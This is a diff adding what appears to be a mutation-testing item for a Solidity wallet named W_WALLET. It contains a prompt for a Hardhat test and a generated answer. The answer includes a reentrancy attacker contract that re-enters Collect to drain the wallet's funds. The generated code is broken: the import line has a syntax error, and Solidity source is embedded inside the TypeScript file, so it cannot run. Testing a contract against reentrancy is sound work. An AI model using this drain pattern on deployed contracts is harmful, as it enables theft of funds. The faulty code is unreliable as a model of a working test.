@@ -1,0 +1,98 @@
+Task: Derive a test case to kill the live Solidity mutant just like a senior test automation engineer would.
+
+Instructions:
+    1 - Generate the Test: Based on the previous hypothesis, you must generate a test case to kill mutant m70b4f541 of W_WALLET.
+        Requirements:       
+        - You must generate a single HardHat test case in Typescript that directly tests the mutant.
+        - The test case should be included in a test file with all all necessary imports, setups, and hooks to ensure it can run as-is. 
+        - You must use the provided Reference Test Suite Setup as a reference for generating the new test case.
+        - Do not use mocks, placeholders or undefined variables, and do not call functions or other elements that do not exist in the smart contract under test W_WALLET.
+        - Pay attention to the syntax of the generated code, avoiding Solidity syntax errors.
+    First think step-by-step, look at the differences between the original and the mutant, consider the hypothesis, and then generate a test case that should be able to detect the mutant.
+
+Reference Test Suite Setup for W_WALLET:
+        Test Suite Setup: import { expect } from "chai"; import { ethers } from "hardhat"; describe("W_WALLET reference (ethers v6; deploy may require constructor arguments)", function () { it("deploy W_WALLET by supplying its REQUIRED constructor arguments (read them from the contract constructor), then call methods and assert; use ethers.parseEther, await (await tx).wait(), and expect(...).to.be.reverted", async function () { const [owner, addr1, addr2] = await ethers.getSigners(); const Factory = await ethers.getContractFactory("W_WALLET"); const instance = await Factory.deploy(...constructorArgs); await instance.waitForDeployment(); }); });
+
+Output Format:
+    Provide your experiment code within the \'```typescript\' and \'```\' markers, without any additional text.
+
+```typescript
+import { expect } from "chai";
+import { ethers } } from "hardhat";
+
+describe("W_WALLET mutant m70b4f541 test - reentrancy guard removal", function () {
+  it("should detect reentrancy vulnerability when nonReentrant_ modifier is removed from Collect", async function () {
+    const [owner, attacker, user] = await ethers.getSigners();
+    
+    // Deploy the Log contract first (required constructor argument for W_WALLET)
+    const LogFactory = await ethers.getContractFactory("Log");
+    const log = await LogFactory.deploy();
+    await log.waitForDeployment();
+    
+    // Deploy W_WALLET with Log address
+    const WalletFactory = await ethers.getContractFactory("W_WALLET");
+    const wallet = await WalletFactory.deploy(await log.getAddress());
+    await wallet.waitForDeployment();
+    
+    // Deploy a malicious contract that will perform the reentrancy attack
+    const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
+    const attackerContract = await ReentrancyAttacker.deploy(await wallet.getAddress());
+    await attackerContract.waitForDeployment();
+    
+    // Fund the attacker contract with 2 ether to have balance to withdraw
+    await owner.sendTransaction({
+      to: await attackerContract.getAddress(),
+      value: ethers.parseEther("2")
+    });
+    
+    // Attacker contract deposits 1 ether into wallet (via fallback)
+    await attackerContract.connect(attacker).attack(ethers.parseEther("1"), { value: ethers.parseEther("1") });
+    
+    // Set unlock time to now so Collect can be called
+    await wallet.connect(attacker).Put(0, { value: ethers.parseEther("0") });
+    
+    // Now trigger the reentrancy attack - attacker contract calls Collect(1 ether)
+    // The malicious receive function will re-enter Collect before balance is updated
+    await attackerContract.connect(attacker).startAttack(ethers.parseEther("1"));
+    
+    // Check that the attacker drained more than their balance
+    const attackerContractBalance = await ethers.provider.getBalance(await attackerContract.getAddress());
+    expect(attackerContractBalance).to.be.gt(ethers.parseEther("1")); // Should have stolen extra funds
+    
+    // The wallet balance should be unexpectedly low
+    const walletBalance = await ethers.provider.getBalance(await wallet.getAddress());
+    expect(walletBalance).to.be.lt(ethers.parseEther("1")); // Should have lost funds due to reentrancy
+  });
+});
+
+// Malicious contract for reentrancy attack
+contract ReentrancyAttacker {
+    address public wallet;
+    uint public targetAmount;
+    
+    constructor(address _wallet) {
+        wallet = _wallet;
+    }
+    
+    function attack(uint _amount) external payable {
+        // Call Put to deposit into wallet
+        (bool success, ) = wallet.call{value: msg.value}(abi.encodeWithSignature("Put(uint256)", 0));
+        require(success, "Put failed");
+    }
+    
+    function startAttack(uint _amount) external {
+        targetAmount = _amount;
+        // Call Collect on the wallet to trigger withdrawal and reentrancy
+        (bool success, ) = wallet.call(abi.encodeWithSignature("Collect(uint256)", _amount));
+        require(success, "Collect failed");
+    }
+    
+    receive() external payable {
+        if (address(wallet).balance >= targetAmount) {
+            // Re-enter Collect before balance is updated
+            (bool success, ) = wallet.call(abi.encodeWithSignature("Collect(uint256)", targetAmount));
+            require(success, "Reentrancy Collect failed");
+        }
+    }
+}
+```
